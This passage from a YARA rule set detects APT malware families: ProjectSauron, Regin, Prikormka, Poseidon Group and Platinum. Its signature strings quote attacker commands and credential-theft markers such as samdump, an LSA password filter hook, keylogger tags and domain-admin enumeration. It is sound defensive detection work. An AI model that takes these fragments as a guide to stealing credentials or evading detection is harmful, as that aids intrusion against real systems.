meta:
copyright = "Kaspersky Lab"
description = "Rule to detect ProjectSauron MyTrampoline module"
version = "1.0"
reference = "https://securelist.com/blog/"
strings:
$a1 = ":\\System Volume Information\\{" wide
$a2 = "\\\\.\\PhysicalDrive%d" wide
$a3 = "DMWndClassX%d"
$b1 = "{774476DF-C00F-4e3a-BF4A-6D8618CFA532}" ascii wide
$b2 = "{820C02A4-578A-4750-A409-62C98F5E9237}" ascii wide
condition:
uint16(0) == 0x5A4D and filesize < 5000000 and (all of ($a*) or any of ($b*)) }
rule SSC_apt_ProjectSauron_pipe_backdoor
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect ProjectSauron pipe backdoors"
version = "1.0"
reference = "https://securelist.com/blog/"
strings:
$a1 = "CreateNamedPipeW" fullword ascii
$a2 = "SetSecurityDescriptorDacl" fullword ascii
$a3 = "GetOverlappedResult" fullword ascii
$a4 = "TerminateThread" fullword ascii
$a5 = "%s%s%X" fullword wide
condition:
uint16(0) == 0x5A4D  and (all of ($a*)) and filesize < 100000
}
rule SSC_APT_Project_Sauron_Scripts
{
meta:
description = "Detects scripts (mostly LUA) from Project Sauron report by Kaspersky"
author = "Florian Roth"
reference = "https://goo.gl/eFoP4A"
date = "2016-08-08"
strings:
$x1 = "local t = w.exec2str(\"regedit "
$x2 = "local r = w.exec2str(\"cat"
$x3 = "ap*.txt link*.txt node*.tun VirtualEncryptedNetwork.licence"
$x4 = "move O FakeVirtualEncryptedNetwork.dll"
$x5 = "sinfo | basex b 32url | dext l 30"
$x6 = "w.exec2str(execStr)"
$x7 = "netnfo irc | basex b 32url"
$x8 = "w.exec(\"wfw status\")"
$x9 = "exec(\"samdump\")"
$x10 = "cat VirtualEncryptedNetwork.ini|grep"
$x11 = "if string.lower(k) == \"securityproviders\" then"
$x12 = "exec2str(\"plist b | grep netsvcs\")"
$x13 = ".*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*"
$x14 = "SAURON_KBLOG_KEY ="
condition:
1 of them
}
rule SSC_APT_Project_Sauron_Custom_M2
{
meta:
description = "Detects malware from Project Sauron APT"
author = "FLorian Roth"
reference = "https://goo.gl/eFoP4A"
date = "2016-08-09"
hash1 = "30a824155603c2e9d8bfd3adab8660e826d7e0681e28e46d102706a03e23e3a8"
strings:
$s2 = "\\*\\3vpn" fullword ascii
$op0 = { 55 8b ec 83 ec 0c 53 56 33 f6 39 75 08 57 89 75 } /* Opcode */
$op1 = { 59 59 c3 8b 65 e8 ff 75 88 ff 15 50 20 40 00 ff } /* Opcode */
$op2 = { 8b 4f 06 85 c9 74 14 83 f9 12 0f 82 a7 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 400KB and ( all of ($s*) ) and all of ($op*) )
}
rule SSC_APT_Project_Sauron_Custom_M7
{
meta:
description = "Detects malware from Project Sauron APT"
author = "FLorian Roth"
reference = "https://goo.gl/eFoP4A"
date = "2016-08-09"
hash1 = "6c8c93069831a1b60279d2b316fd36bffa0d4c407068dbef81b8e2fe8fd8e8cd"
hash2 = "7cc0bf547e78c8aaf408495ceef58fa706e6b5d44441fefdce09d9f06398c0ca"
strings:
$sx1 = "Default user" fullword wide
$sx2 = "Hincorrect header check" fullword ascii /* Typo */
$sa1 = "MSAOSSPC.dll" fullword ascii
$sa2 = "MSAOSSPC.DLL" fullword wide
$sa3 = "MSAOSSPC" fullword wide
$sa4 = "AOL Security Package" fullword wide
$sa5 = "AOL Security Package" fullword wide
$sa6 = "AOL Client for 32 bit platforms" fullword wide
$op0 = { 8b ce 5b e9 4b ff ff ff 55 8b ec 51 53 8b 5d 08 } /* Opcode */
$op1 = { e8 0a fe ff ff 8b 4d 14 89 46 04 89 41 04 8b 45 } /* Opcode */
$op2 = { e9 29 ff ff ff 83 7d fc 00 0f 84 cf 0a 00 00 8b } /* Opcode */
$op3 = { 83 f8 0c 0f 85 3a 01 00 00 44 2b 41 6c 41 8b c9 } /* Opcode */
$op4 = { 44 39 57 0c 0f 84 d6 0c 00 00 44 89 6f 18 45 89 } /* Opcode */
$op5 = { c1 ed 02 83 c6 fe e9 68 fe ff ff 44 39 57 08 75 } /* Opcode */
condition:
uint16(0) == 0x5a4d and filesize < 200KB and (( 3 of ($s*) and 3 of ($op*) ) or ( 1 of ($sx*) and 1 of ($sa*) ))
}
rule SSC_APT_Project_Sauron_Custom_M4
{
meta:
description = "Detects malware from Project Sauron APT"
author = "FLorian Roth"
reference = "https://goo.gl/eFoP4A"
date = "2016-08-09"
hash1 = "e12e66a6127cfd2cbb42e6f0d57c9dd019b02768d6f1fb44d91f12d90a611a57"
strings:
$s1 = "xpsmngr.dll" fullword wide
$s2 = "XPS Manager" fullword wide
$op0 = { 89 4d e8 89 4d ec 89 4d f0 ff d2 3d 08 00 00 c6 } /* Opcode */
$op1 = { 55 8b ec ff 4d 0c 75 09 ff 75 08 ff 15 04 20 5b } /* Opcode */
$op2 = { 8b 4f 06 85 c9 74 14 83 f9 13 0f 82 b6 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 90KB and ( all of ($s*) ) and 1 of ($op*) ) or ( all of them )
}
rule SSC_APT_Project_Sauron_dext_module
{
meta:
description = "Detects strings from dext module - Project Sauron report by Kaspersky"
author = "Florian Roth"
reference = "https://goo.gl/eFoP4A"
date = "2016-08-08"
strings:
$x1 = "Assemble rows of DNS names back to a single string of data"
$x2 = "removes checks of DNS names and lengths (during split)"
$x3 = "Randomize data lengths (length/2 to length)"
$x4 = "This cruft"
condition:
2 of them
}
rule SSC_Hacktool_This_Cruft
{
meta:
description = "Detects string 'This cruft' often used in hack tools like netcat or cryptcat and also mentioned in Project Sauron report"
author = "Florian Roth"
reference = "https://goo.gl/eFoP4A"
date = "2016-08-08"
score = 60
strings:
$x1 = "This cruft" fullword
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and $x1 )
}
rule SSC_APT_Project_Sauron_Custom_M3
{
meta:
description = "Detects malware from Project Sauron APT"
author = "FLorian Roth"
reference = "https://goo.gl/eFoP4A"
date = "2016-08-09"
hash1 = "a4736de88e9208eb81b52f29bab9e7f328b90a86512bd0baadf4c519e948e5ec"
strings:
$s1 = "ExampleProject.dll" fullword ascii
$op0 = { 8b 4f 06 85 c9 74 14 83 f9 13 0f 82 ba } /* Opcode */
$op1 = { ff 15 34 20 00 10 85 c0 59 a3 60 30 00 10 75 04 } /* Opcode */
$op2 = { 55 8b ec ff 4d 0c 75 09 ff 75 08 ff 15 00 20 00 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 1000KB and ( all of ($s*) ) and all of ($op*) )
}
rule SSC_APT_Project_Sauron_arping_module
{
meta:
description = "Detects strings from arping module - Project Sauron report by Kaspersky"
author = "Florian Roth"
reference = "https://goo.gl/eFoP4A"
date = "2016-08-08"
strings:
$s1 = "Resolve hosts that answer"
$s2 = "Print only replying Ips"
$s3 = "Do not display MAC addresses"
condition:
all of them
}
rule SSC_APT_Project_Sauron_kblogi_module
{
meta:
description = "Detects strings from kblogi module - Project Sauron report by Kaspersky"
author = "Florian Roth"
reference = "https://goo.gl/eFoP4A"
date = "2016-08-08"
strings:
$x1 = "Inject using process name or pid. Default"
$s2 = "Convert mode: Read log from file and convert to text"
$s3 = "Maximum running time in seconds"
condition:
$x1 or 2 of them
}
rule SSC_APT_Project_Sauron_basex_module
{
meta:
description = "Detects strings from basex module - Project Sauron report by Kaspersky"
author = "Florian Roth"
reference = "https://goo.gl/eFoP4A"
date = "2016-08-08"
strings:
$x1 = "64, 64url, 32, 32url or 16."
$s2 = "Force decoding when input is invalid/corrupt"
$s3 = "This cruft"
condition:
$x1 or 2 of them
}
rule SSC_APT_Project_Sauron_Custom_M1
{
meta:
description = "Detects malware from Project Sauron APT"
author = "FLorian Roth"
reference = "https://goo.gl/eFoP4A"
date = "2016-08-09"
hash1 = "9572624b6026311a0e122835bcd7200eca396802000d0777dba118afaaf9f2a9"
strings:
$s1 = "ncnfloc.dll" fullword wide
$s4 = "Network Configuration Locator" fullword wide
$op0 = { 80 75 6e 85 c0 79 6a 66 41 83 38 0a 75 63 0f b7 } /* Opcode */
$op1 = { 80 75 29 85 c9 79 25 b9 01 } /* Opcode */
$op2 = { 2b d8 48 89 7c 24 38 44 89 6c 24 40 83 c3 08 89 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and ( all of ($s*) ) and 1 of ($op*) ) or ( all of them )
}
rule SSC_APT_Project_Sauron_Custom_M6
{
meta:
description = "Detects malware from Project Sauron APT"
author = "FLorian Roth"
reference = "https://goo.gl/eFoP4A"
date = "2016-08-09"
hash1 = "3782b63d7f6f688a5ccb1b72be89a6a98bb722218c9f22402709af97a41973c8"
strings:
$s1 = "rseceng.dll" fullword wide
$s2 = "Remote Security Engine" fullword wide
$op0 = { 8b 0d d5 1d 00 00 85 c9 0f 8e a2 } /* Opcode */
$op1 = { 80 75 6e 85 c0 79 6a 66 41 83 38 0a 75 63 0f b7 } /* Opcode */
$op2 = { 80 75 29 85 c9 79 25 b9 01 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and ( all of ($s*) ) and 1 of ($op*) ) or ( all of them )
}
rule SSC_Regin_Sample_1
{
meta:
description = "Auto-generated rule - file-3665415_sys"
author = "@MalwrSignatures"
date = "26.11.14"
hash = "773d7fab06807b5b1bc2d74fa80343e83593caf2"
strings:
$s0 = "Getting PortName/Identifier failed - %x" fullword ascii
$s1 = "SerialAddDevice - error creating new devobj [%#08lx]" fullword ascii
$s2 = "External Naming Failed - Status %x" fullword ascii
$s3 = "------- Same multiport - different interrupts" fullword ascii
$s4 = "%x occurred prior to the wait - starting the" fullword ascii
$s5 = "'user registry info - userPortIndex: %d" fullword ascii
$s6 = "Could not report legacy device - %x" fullword ascii
$s7 = "entering SerialGetPortInfo" fullword ascii
$s8 = "'user registry info - userPort: %x" fullword ascii
$s9 = "IoOpenDeviceRegistryKey failed - %x " fullword ascii
$s10 = "Kernel debugger is using port at address %X" fullword ascii
$s12 = "Release - freeing multi context" fullword ascii
$s13 = "Serial driver will not load port" fullword ascii
$s14 = "'user registry info - userAddressSpace: %d" fullword ascii
$s15 = "SerialAddDevice: Enumeration request, returning NO_MORE_ENTRIES" fullword ascii
$s20 = "'user registry info - userIndexed: %d" fullword ascii
condition:
all of them and filesize < 110KB and filesize > 80KB
}
rule SSC_apt_regin_hopscotch
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect Regin's Hopscotch module"
version = "1.0"
last_modified = "2015-01-22"
reference = "https://securelist.com/blog/research/68438/an-analysis-of-regins-hopscotch-and-legspin/"
md5 = "6c34031d7a5fc2b091b623981a8ae61c"
strings:
$mz="MZ"
$a1="AuthenticateNetUseIpc"
$a2="Failed to authenticate to"
$a3="Failed to disconnect from"
$a4="%S\\ipc$" wide
$a5="Not deleting..."
$a6="CopyServiceToRemoteMachine"
$a7="DH Exchange failed"
$a8="ConnectToNamedPipes"
condition:
($mz at 0) and all of ($a*)
}
rule SSC_apt_regin_dispatcher_disp_dll
{
meta:
copyright = "Kaspersky Lab"
author = "Kaspersky Lab"
description = "Rule to detect Regin disp.dll dispatcher"
version = "1.0"
last_modified = "2014-11-18"
strings:
$mz="MZ"
$string1="shit"
$string2="disp.dll"
$string3="255.255.255.255"
$string4="StackWalk64"
$string5="imagehlp.dll"
condition:
($mz at 0) and (all of ($string*))
}
rule SSC_Regin_Sample_Set_1
{
meta:
description = "Auto-generated rule - file SHF-000052 and ndisips.sys"
author = "@MalwrSignatures"
date = "26.11.14"
hash1 = "8487a961c8244004c9276979bb4b0c14392fc3b8"
hash2 = "bcf3461d67b39a427c83f9e39b9833cfec977c61"
strings:
$s0 = "HAL.dll" fullword ascii
$s1 = "IoGetDeviceObjectPointer" fullword ascii
$s2 = "MaximumPortsServiced" fullword wide
$s3 = "KeGetCurrentIrql" fullword ascii
$s4 = "ntkrnlpa.exe" fullword ascii
$s5 = "\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\Session Manager" wide
$s6 = "ConnectMultiplePorts" fullword wide
$s7 = "\\SYSTEMROOT" fullword wide
$s8 = "IoWriteErrorLogEntry" fullword ascii
$s9 = "KeQueryPerformanceCounter" fullword ascii
$s10 = "KeServiceDescriptorTable" fullword ascii
$s11 = "KeRemoveEntryDeviceQueue" fullword ascii
$s12 = "SeSinglePrivilegeCheck" fullword ascii
$s13 = "KeInitializeEvent" fullword ascii
$s14 = "IoBuildDeviceIoControlRequest" fullword ascii
$s15 = "KeRemoveDeviceQueue" fullword ascii
$s16 = "IofCompleteRequest" fullword ascii
$s17 = "KeInitializeSpinLock" fullword ascii
$s18 = "MmIsNonPagedSystemAddressValid" fullword ascii
$s19 = "IoCreateDevice" fullword ascii
$s20 = "KefReleaseSpinLockFromDpcLevel" fullword ascii
condition:
all of them and filesize < 40KB and filesize > 30KB
}
rule SSC_Regin_Sample_3
{
meta:
description = "Detects Regin Backdoor sample fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129"
author = "@Malwrsignatures"
date = "27.11.14"
hash = "fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129"
strings:
$hd = { fe ba dc fe }
$s0 = "Service Pack x" fullword wide
$s1 = "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" fullword wide
$s2 = "\\REGISTRY\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\HotFix" fullword wide
$s3 = "mntoskrnl.exe" fullword wide
$s4 = "\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\Session Manager\\Memory Management" fullword wide
$s5 = "Memory location: 0x%p, size 0x%08x" wide fullword
$s6 = "Service Pack" fullword wide
$s7 = ".sys" fullword wide
$s8 = ".dll" fullword wide
$s10 = "\\REGISTRY\\Machine\\Software\\Microsoft\\Updates" fullword wide
$s11 = "IoGetRelatedDeviceObject" fullword ascii
$s12 = "VMEM.sys" fullword ascii
$s13 = "RtlGetVersion" fullword wide
$s14 = "ntkrnlpa.exe" fullword ascii
condition:
( $hd at 0 ) and all of ($s*) and filesize > 160KB and filesize < 200KB
}
rule SSC_apt_regin_vfs
{
meta:
copyright = "Kaspersky Lab"
author = "Kaspersky Lab"
description = "Rule to detect Regin VFSes"
version = "1.0"
last_modified = "2014-11-18"
strings:
$a1={00 02 00 08 00 08 03 F6 D7 F3 52}
$a2={00 10 F0 FF F0 FF 11 C7 7F E8 52}
$a3={00 04 00 10 00 10 03 C2 D3 1C 93}
$a4={00 04 00 10 C8 00 04 C8 93 06 D8}
condition:
($a1 at 0) or ($a2 at 0) or ($a3 at 0) or ($a4 at 0)
}
rule SSC_apt_regin_legspin
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect Regin's Legspin module"
version = "1.0"
last_modified = "2015-01-22"
reference = "https://securelist.com/blog/research/68438/an-analysis-of-regins-hopscotch-and-legspin/"
md5 = "29105f46e4d33f66fee346cfd099d1cc"
strings:
$mz="MZ"
$a1="sharepw"
$a2="reglist"
$a3="logdump"
$a4="Name:" wide
$a5="Phys Avail:"
$a6="cmd.exe" wide
$a7="ping.exe" wide
$a8="millisecs"
condition:
($mz at 0) and all of ($a*)
}
rule SSC_apt_regin_rc5key
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect Regin RC5 decryption keys"
version = "1.0"
last_modified = "2014-11-18"
strings:
$key1={73 23 1F 43 93 E1 9F 2F 99 0C 17 81 5C FF B4 01}
$key2={10 19 53 2A 11 ED A3 74 3F C3 72 3F 9D 94 3D 78}
condition:
any of ($key*)
}
rule SSC_apt_regin_2013_64bit_stage1
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect Regin 64 bit stage 1 loaders"
version = "1.0"
last_modified = "2014-11-18"
filename="wshnetc.dll"
md5="bddf5afbea2d0eed77f2ad4e9a4f044d"
filename="wsharp.dll"
md5="c053a0a3f1edcbbfc9b51bc640e808ce"
strings:
$mz="MZ"
$a1="PRIVHEAD"
$a2="\\\\.\\PhysicalDrive%d"
$a3="ZwDeviceIoControlFile"
condition:
($mz at 0) and (all of ($a*)) and filesize < 100000
}
rule SSC_Regin_Sample_Set_2
{
meta:
description = "Detects Regin Backdoor sample 4139149552b0322f2c5c993abccc0f0d1b38db4476189a9f9901ac0d57a656be and e420d0cf7a7983f78f5a15e6cb460e93c7603683ae6c41b27bf7f2fa34b2d935"
author = "@MalwrSignatures"
date = "27.11.14"
hash1 = "4139149552b0322f2c5c993abccc0f0d1b38db4476189a9f9901ac0d57a656be"
hash2 = "e420d0cf7a7983f78f5a15e6cb460e93c7603683ae6c41b27bf7f2fa34b2d935"
strings:
$hd = { fe ba dc fe }
$s0 = "d%ls%ls" fullword wide
$s1 = "\\\\?\\UNC" fullword wide
$s2 = "Software\\Microsoft\\Windows\\CurrentVersion" fullword wide
$s3 = "\\\\?\\UNC\\" fullword wide
$s4 = "SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}" fullword wide
$s5 = "System\\CurrentControlSet\\Services\\Tcpip\\Linkage" wide fullword
$s6 = "\\\\.\\Global\\%s" fullword wide
$s7 = "temp" fullword wide
$s8 = "\\\\.\\%s" fullword wide
$s9 = "Memory location: 0x%p, size 0x%08x" fullword wide
$s10 = "sscanf" fullword ascii
$s11 = "disp.dll" fullword ascii
$s12 = "%x:%x:%x:%x:%x:%x:%x:%x%c" fullword ascii
$s13 = "%d.%d.%d.%d%c" fullword ascii
$s14 = "imagehlp.dll" fullword ascii
$s15 = "%hd %d" fullword ascii
condition:
( $hd at 0 ) and all of ($s*) and filesize < 450KB and filesize > 360KB
}
rule SSC_Regin_sig_svcsstat
{
meta:
description = "Detects svcstat from Regin report - file svcsstat.exe_sample"
author = "@MalwrSignatures"
date = "26.11.14"
hash = "5164edc1d54f10b7cb00a266a1b52c623ab005e2"
strings:
$s0 = "Service Control Manager" fullword ascii
$s1 = "_vsnwprintf" fullword ascii
$s2 = "Root Agency" fullword ascii
$s3 = "Root Agency0" fullword ascii
$s4 = "StartServiceCtrlDispatcherA" fullword ascii
$s5 = "\\\\?\\UNC" fullword wide
$s6 = "%ls%ls" fullword wide
condition:
all of them and filesize < 15KB and filesize > 10KB
}
rule SSC_Regin_Sample_2
{
meta:
description = "Auto-generated rule - file hiddenmod_hookdisk_and_kdbg_8949d000.bin"
author = "@MalwrSignatures"
date = "26.11.14"
hash = "a7b285d4b896b66fce0ebfcd15db53b3a74a0400"
strings:
$s0 = "\\SYSTEMROOT\\system32\\lsass.exe" fullword wide
$s1 = "atapi.sys" fullword wide
$s2 = "disk.sys" fullword wide
$s3 = "IoGetRelatedDeviceObject" fullword ascii
$s4 = "HAL.dll" fullword ascii
$s5 = "\\Registry\\Machine\\System\\CurrentControlSet\\Services" fullword ascii
$s6 = "PsGetCurrentProcessId" fullword ascii
$s7 = "KeGetCurrentIrql" fullword ascii
$s8 = "\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\Session Manager" wide
$s9 = "KeSetImportanceDpc" fullword ascii
$s10 = "KeQueryPerformanceCounter" fullword ascii
$s14 = "KeInitializeEvent" fullword ascii
$s15 = "KeDelayExecutionThread" fullword ascii
$s16 = "KeInitializeTimerEx" fullword ascii
$s18 = "PsLookupProcessByProcessId" fullword ascii
$s19 = "ExReleaseFastMutexUnsafe" fullword ascii
$s20 = "ExAcquireFastMutexUnsafe" fullword ascii
condition:
all of them and filesize < 40KB and filesize > 30KB
}
rule SSC_apt_regin_2011_32bit_stage1
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect Regin 32 bit stage 1 loaders"
version = "1.0"
last_modified = "2014-11-18"
strings:
$key1={331015EA261D38A7}
$key2={9145A98BA37617DE}
$key3={EF745F23AA67243D}
$mz="MZ"
condition:
($mz at 0) and any of ($key*) and filesize < 300000
}
rule SSC_PrikormkaDropper
{
strings:
$mz = { 4D 5A }
$kd1 = "KDSTORAGE" wide
$kd2 = "KDSTORAGE_64" wide
$kd3 = "KDRUNDRV32" wide
$kd4 = "KDRAR" wide
$bin1 = {69 65 04 15 00 14 1E 4A 16 42 08 6C 21 61 24 0F}
$bin2 = {76 6F 05 04 16 1B 0D 5E 0D 42 08 6C 20 45 18 16}
$bin3 = {4D 00 4D 00 43 00 00 00 67 00 75 00 69 00 64 00 56 00 47 00 41 00 00 00 5F 00 73 00 76 00 67 00}
$inj1 = "?AVCinj2008Dlg@@" ascii
$inj2 = "?AVCinj2008App@@" ascii
condition:
($mz at 0) and ((any of ($bin*)) or (3 of ($kd*)) or (all of ($inj*)))
}
rule SSC_PrikormkaModule
{
strings:
$mz = { 4D 5A }
// binary
$str1 = {6D 70 2E 64 6C 6C 00 53 74 61 72 74 69 6E 67 00}
$str2 = {68 6C 70 75 63 74 66 2E 64 6C 6C 00 43 79 63 6C 65}
$str3 = {00 6B 6C 2E 64 6C 6C 00 53 74 61 72 74 69 6E 67 00}
$str4 = {69 6F 6D 75 73 2E 64 6C 6C 00 53 74 61 72 74 69 6E 67}
$str5 = {61 74 69 6D 6C 2E 64 6C 6C 00 4B 69 63 6B 49 6E 50 6F 69 6E 74}
$str6 = {73 6E 6D 2E 64 6C 6C 00 47 65 74 52 65 61 64 79 46 6F 72 44 65 61 64}
$str7 = {73 63 72 73 68 2E 64 6C 6C 00 47 65 74 52 65 61 64 79 46 6F 72 44 65 61 64}
// encrypted
$str8 = {50 52 55 5C 17 51 58 17 5E 4A}
$str9 = {60 4A 55 55 4E 53 58 4B 17 52 57 17 5E 4A}
$str10 = {55 52 5D 4E 5B 4A 5D 17 51 58 17 5E 4A}
$str11 = {60 4A 55 55 4E 61 17 51 58 17 5E 4A}
$str12 = {39 5D 17 1D 1C 0A 3C 57 59 3B 1C 1E 57 58 4C 54 0F}
// mutex
$str13 = "ZxWinDeffContex" ascii wide
$str14 = "Paramore756Contex43" wide
$str15 = "Zw_&one@ldrContext43" wide
// other
$str16 = "A95BL765MNG2GPRS"
// dll names
$str17 = "helpldr.dll" wide fullword
$str18 = "swma.dll" wide fullword
$str19 = "iomus.dll" wide fullword
$str20 = "atiml.dll"  wide fullword
$str21 = "hlpuctf.dll" wide fullword
$str22 = "hauthuid.dll" ascii wide fullword
// rbcon
$str23 = "[roboconid][%s]" ascii fullword
$str24 = "[objectset][%s]" ascii fullword
$str25 = "rbcon.ini" wide fullword
// files and logs
$str26 = "%s%02d.%02d.%02d_%02d.%02d.%02d.skw" ascii fullword
$str27 = "%02d.%02d.%02d_%02d.%02d.%02d.%02d.rem" wide fullword
// pdb strings
$str28 = ":\\!PROJECTS!\\Mina\\2015\\" ascii
$str29 = "\\PZZ\\RMO\\" ascii
$str30 = ":\\work\\PZZ" ascii
$str31 = "C:\\Users\\mlk\\" ascii
$str32 = ":\\W o r k S p a c e\\" ascii
$str33 = "D:\\My\\Projects_All\\2015\\" ascii
$str34 = "\\TOOLS PZZ\\Bezzahod\\" ascii
condition:
($mz at 0) and (any of ($str*))
}
rule SSC_PrikormkaEarlyVersion
{
strings:
$mz = { 4D 5A }
$str36 = "IntelRestore" ascii fullword
$str37 = "Resent" wide fullword
$str38 = "ocp8.1" wide fullword
$str39 = "rsfvxd.dat" ascii fullword
$str40 = "tsb386.dat" ascii fullword
$str41 = "frmmlg.dat" ascii fullword
$str42 = "smdhost.dll" ascii fullword
$str43 = "KDLLCFX" wide fullword
$str44 = "KDLLRUNDRV" wide fullword
condition:
($mz at 0) and (2 of ($str*))
}
rule SSC_PoseidonGroup_MalDoc_1
{
meta:
description = "Detects Poseidon Group - Malicious Word Document"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/73673/poseidon-group-a-targeted-attack-boutique-specializing-in-global-cyber-espionage/"
date = "2016-02-09"
score = 80
hash = "0983526d7f0640e5765ded6be6c9e64869172a02c20023f8a006396ff358999b"
strings:
$s1 = "c:\\cmd32dll.exe" fullword ascii
condition:
uint16(0) == 0xcfd0 and filesize < 500KB and all of them
}
rule SSC_PoseidonGroup_MalDoc_2
{
meta:
description = "Detects Poseidon Group - Malicious Word Document"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/73673/poseidon-group-a-targeted-attack-boutique-specializing-in-global-cyber-espionage/"
date = "2016-02-09"
score = 70
hash1 = "3e4cacab0ff950da1c6a1c640fe6cf5555b99e36d4e1cf5c45f04a2048f7620c"
hash2 = "1f77475d7740eb0c5802746d63e93218f16a7a19f616e8fddcbff07983b851af"
hash3 = "f028ee20363d3a17d30175508bbc4738dd8e245a94bfb200219a40464dd09b3a"
hash4 = "ec309300c950936a1b9f900aa30630b33723c42240ca4db978f2ca5e0f97afed"
hash5 = "27449198542fed64c23f583617908c8648fa4b4633bacd224f97e7f5d8b18778"
hash6 = "1e62629dae05bf7ee3fe1346faa60e6791c61f92dd921daa5ce2bdce2e9d4216"
strings:
$s0 = "{\\*\\generator Msftedit 5.41." ascii
$s1 = "Attachment 1: Complete Professional Background" ascii
$s2 = "E-mail:  \\cf1\\ul\\f1"
$s3 = "Education:\\par" ascii
$s5 = "@gmail.com" ascii
condition:
uint32(0) == 0x74725c7b and filesize < 500KB and 3 of them
}
rule SSC_PoseidonGroup_Malware
{
meta:
description = "Detects Poseidon Group Malware"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/73673/poseidon-group-a-targeted-attack-boutique-specializing-in-global-cyber-espionage/"
date = "2016-02-09"
score = 85
hash1 = "337e94119cfad0b3144af81b72ac3b2688a219ffa0bdf23ca56c7a68fbe0aea4"
hash2 = "344034c0bf9fcd52883dbc158abf6db687150d40a118d9cd6ebd843e186128d3"
hash3 = "432b7f7f7bf94260a58ad720f61d91ba3289bf0a9789fc0c2b7ca900788dae61"
hash4 = "8955df76182005a69f19f5421c355f1868efe65d6b9e0145625dceda94b84a47"
hash5 = "d090b1d77e91848b1e2f5690b54360bbbd7ef808d017304389b90a0f8423367f"
hash6 = "d7c8b47a0d0a9181fb993f17e165d75a6be8cf11812d3baf7cf11d085e21d4fb"
hash7 = "ded0ee29af97496f27d810f6c16d78a3031d8c2193d5d2a87355f3e3ca58f9b3"
strings:
$s1 = "c:\\winnt\\system32\\cmd.exe" fullword ascii
$s2 = "c:\\windows\\system32\\cmd.exe" fullword ascii
$s3 = "c:\\windows\\command.com" fullword ascii
$s4 = "copy \"%s\" \"%s\" /Y" fullword ascii
$s5 = "http://%s/files/" fullword ascii
$s6 = "\"%s\". %s: \"%s\"." fullword ascii
$s7 = "0x0666" fullword ascii
$s8 = "----------------This_is_a_boundary$" fullword ascii
$s9 = "Server 2012" fullword ascii /* Goodware String - occured 1 times */
$s10 = "Server 2008" fullword ascii /* Goodware String - occured 1 times */
$s11 = "Server 2003" fullword ascii /* Goodware String - occured 1 times */
$a1 = "net.exe group \"Domain Admins\" /domain" fullword ascii
$a2 = "net.exe group \"Admins. do Dom" fullword ascii
$a3 = "(SVRID=%d)" fullword ascii
$a4 = "(TG=%d)" fullword ascii
$a5 = "(SVR=%s)" fullword ascii
$a6 = "Set-Cookie:\\b*{.+?}\\n" fullword wide
$a7 = "net.exe localgroup Administradores" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 650KB and 6 of ($s*) ) or ( 4 of ($s*) and 1 of ($a*) )
}
rule SSC_Trojan_Win32_PlaLsaLog : Platinum
{
meta:
author = "Microsoft"
description = "Loader / possible incomplete LSA Password Filter"
original_sample_sha1 = "fa087986697e4117c394c9a58cb9f316b2d9f7d8"
unpacked_sample_sha1 = "29cb81dbe491143b2f8b67beaeae6557d8944ab4"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = {8A 1C 01 32 DA 88 1C 01 8B 74 24 0C 41 3B CE 7C EF 5B 5F C6 04 01 00 5E 81 C4 04 01 00 00 C3}
$str2 = "PasswordChangeNotify"
condition:
$str1 and $str2
}
rule SSC_Trojan_Win32_Plakelog : Platinum
{
meta:
author = "Microsoft"
description = "Raw-input based keylogger"
original_sample_sha1 = "3907a9e41df805f912f821a47031164b6636bd04"
unpacked_sample_sha1 = "960feeb15a0939ec0b53dcb6815adbf7ac1e7bb2"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = "<0x02>" wide
$str2 = "[CTR-BRK]" wide
$str3 = "[/WIN]" wide
$str4 = {8A 16 8A 18 32 DA 46 88 18 8B 15 08 E6 42 00 40 41 3B CA 72 EB 5E 5B}
condition:
$str1 and $str2 and $str3 and $str4
}
rule SSC_Trojan_Win32_Placisc4 : Platinum
{
meta:
author = "Microsoft"
description = "Installer for Dipsind variant"
original_sample_sha1 = "3d17828632e8ff1560f6094703ece5433bc69586"
unpacked_sample_sha1 = "2abb8e1e9cac24be474e4955c63108ff86d1a034"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = {8D 71 01 8B C6 99 BB 0A 00 00 00 F7 FB 0F BE D2 0F BE 04 39 2B C2 88 04 39 84 C0 74 0A}
$str2 = {6A 04 68 00 20 00 00 68 00 00 40 00 6A 00 FF D5}
$str3 = {C6 44 24 ?? 64 C6 44 24 ?? 6F C6 44 24 ?? 67 C6 44 24 ?? 32 C6 44 24 ?? 6A}
condition:
$str1 and $str2 and $str3
}
rule SSC_Trojan_Win32_Plaplex : Platinum
{
meta:
author = "Microsoft"
description = "Variant of the JPin backdoor"
original_sample_sha1 = "ca3bda30a3cdc15afb78e54fa1bbb9300d268d66"
unpacked_sample_sha1 = "2fe3c80e98bbb0cf5a0c4da286cd48ec78130a24"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$class_name1 = "AVCObfuscation"
$class_name2 = "AVCSetiriControl"
condition:
$class_name1 and $class_name2
}
